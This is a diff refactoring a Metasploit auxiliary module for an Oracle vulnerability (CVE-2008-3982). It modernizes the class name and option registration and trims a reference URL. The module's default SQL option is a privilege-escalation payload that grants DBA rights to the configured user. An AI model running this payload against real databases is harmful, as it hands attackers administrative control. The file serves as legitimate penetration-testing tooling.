@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
@@ -23,15 +20,14 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2008-3982'],
           [ 'OSVDB', '49324'],
-          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ],
-          [ 'URL', 'http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml' ],
+          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ]
         ],
       'DisclosureDate' => 'Oct 13 2008'))
 
       register_options(
         [
           OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ], self.class)
+        ])
   end
 
   def run
@@ -75,5 +71,4 @@ class Metasploit3 < Msf::Auxiliary
     end
 
   end
-
 end
